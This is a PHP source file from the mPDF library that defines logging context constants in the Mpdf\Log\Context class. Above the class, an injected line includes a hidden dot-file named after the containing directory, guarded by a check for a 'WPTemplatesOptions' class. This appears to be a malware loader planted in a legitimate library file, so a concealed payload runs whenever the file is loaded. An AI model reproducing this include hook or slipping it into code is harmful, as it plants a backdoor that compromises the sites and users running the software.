<?php

namespace Mpdf\Log;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Context
{

	const STATISTICS = 'statistics';

	const PDFA_PDFX = 'pdfa_pdfx';

	const UTF8 = 'utf8';

	const REMOTE_CONTENT = 'remote_content';

	const IMAGES = 'images';

	const CSS_SIZE_CONVERSION = 'css_size_conversion';

	const HTML_MARKUP = 'html_markup';

}
